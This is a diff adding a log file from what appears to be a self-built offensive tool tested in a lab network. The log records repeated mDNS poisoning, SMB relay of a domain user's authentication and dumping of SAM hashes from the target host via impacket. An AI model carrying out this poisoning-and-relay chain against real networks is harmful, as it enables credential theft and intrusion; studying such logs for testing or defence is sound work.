@@ -1,0 +1,540 @@
+2021-11-22 10:32:45.892 | INFO     | project.igris:show_settable_variables_necessary:225 - Showing necessary settable variables
+2021-11-23 10:56:27.046 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 10:56:27.050 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 10:56:27.071 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 10:57:48.320 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 10:57:51.818 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 10:58:17.487 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 10:58:17.518 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 10:58:41.988 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 10:58:42.030 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 10:58:48.854 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 10:58:48.894 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 11:03:08.120 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:03:08.155 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:03:18.492 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:03:18.526 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:03:30.094 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:03:30.130 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:03:31.327 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:03:33.173 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:03:33.183 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:03:33.231 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:03:33.257 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:03:34.407 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:03:35.349 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:03:35.986 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:03:35.993 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:03:38.517 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:03:44.726 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 11:07:36.860 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:431 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-23 11:07:41.293 | INFO     | project.ManInTheMiddle.maninthemiddle:__checking_conditions_for_attack:485 - Exiting ...
+2021-11-23 11:07:46.426 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:07:46.431 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:07:46.446 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:07:57.607 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:07:57.638 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:07:58.741 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:07:58.766 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:07:58.771 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:07:58.892 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:07:58.909 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:08:00.058 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:08:00.306 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:08:00.945 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:08:00.965 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:08:07.221 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:11:00.362 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:11:00.366 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:11:00.370 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:11:04.033 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:12:05.329 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:12:05.330 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:12:05.342 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:12:13.185 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:12:13.222 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:12:14.304 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:12:14.349 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:12:14.359 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:12:14.399 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:12:14.410 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:12:15.360 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:12:15.390 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:12:15.519 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:12:15.621 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:12:16.126 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:12:16.137 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:12:22.301 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:12:46.374 | ERROR    | project.igris:do_cd:180 - /sam is not a directory
+2021-11-23 11:12:49.126 | ERROR    | project.igris:do_cd:180 - /sam is not a directory
+2021-11-23 11:12:50.278 | ERROR    | project.igris:do_cd:163 - cd needs one argument:
+2021-11-23 11:12:54.382 | ERROR    | project.igris:do_cd:180 - /sam is not a directory
+2021-11-23 11:13:49.096 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-23 11:13:51.185 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:13:51.186 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:13:51.195 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:14:06.179 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:14:06.222 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:14:07.205 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:14:07.264 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:14:07.274 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:14:07.316 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:14:07.330 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:14:08.416 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:14:08.547 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:14:09.067 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:14:09.071 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:14:11.333 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:14:16.114 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 11:14:50.342 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-23 11:14:52.057 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:14:52.060 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:14:52.075 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:15:00.494 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:15:00.526 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:15:01.508 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:15:01.541 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:15:01.551 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:15:01.629 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:15:01.658 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:15:02.613 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:15:02.649 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:15:02.747 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:15:02.870 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:15:03.204 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:15:03.209 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:15:06.993 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:16:08.739 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-23 11:16:16.810 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:16:16.814 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:16:16.826 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:16:17.139 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:16:17.170 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:16:18.514 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 11:16:18.551 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 11:16:27.132 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:16:27.166 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:16:27.868 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.129[0m
+2021-11-23 11:16:27.902 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::1cb7:6a5:258:73f9[0m
+2021-11-23 11:16:37.774 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:16:37.814 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:16:50.763 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:16:50.794 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:16:51.901 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:16:51.976 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:16:51.990 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:16:52.025 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:16:52.039 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:16:53.118 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:16:53.298 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:16:53.798 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:16:53.802 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:16:55.653 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:17:18.757 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:17:18.759 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:17:18.753 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:17:34.942 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:17:34.974 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:17:35.959 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:17:35.985 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:17:35.998 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:17:36.035 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:17:36.049 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:17:37.153 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:17:37.451 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:17:38.866 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:17:38.885 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:17:41.197 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:17:45.764 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 11:36:20.928 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:36:20.931 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:36:20.933 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:36:21.002 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:36:21.034 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:37:13.751 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:37:13.786 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:37:15.038 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:37:15.184 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:37:15.194 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:37:15.244 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:37:15.261 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:37:16.343 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:37:16.392 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:37:16.865 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:37:16.868 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:37:23.055 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:37:23.090 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:37:23.225 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:44:25.033 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 11:44:27.747 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:44:27.742 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:44:27.755 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:44:33.951 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:44:33.990 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:44:35.106 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-23 11:44:35.179 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-23 11:44:35.184 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-23 11:44:35.285 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-23 11:44:35.333 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-23 11:44:36.503 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-23 11:44:36.717 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-23 11:44:37.488 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-23 11:44:37.494 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-23 11:44:51.521 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:44:53.544 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 11:47:34.948 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/am is not a directory
+2021-11-23 11:47:40.384 | ERROR    | project.igris:do_cd:180 - /home/rsgbengi/Igris/sam is not a directory
+2021-11-23 11:48:13.951 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:48:13.953 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:48:13.955 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:48:29.620 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:48:29.658 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:48:34.063 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:48:34.094 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:48:44.642 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:48:44.674 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:48:54.783 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:48:54.818 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:49:33.300 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:49:33.338 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:49:34.314 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:49:34.346 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:02.104 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:52:02.142 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:04.222 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-23 11:52:04.254 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-23 11:52:07.613 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-23 11:52:17.467 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-23 11:52:17.468 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-23 11:52:17.471 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-23 11:52:24.867 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
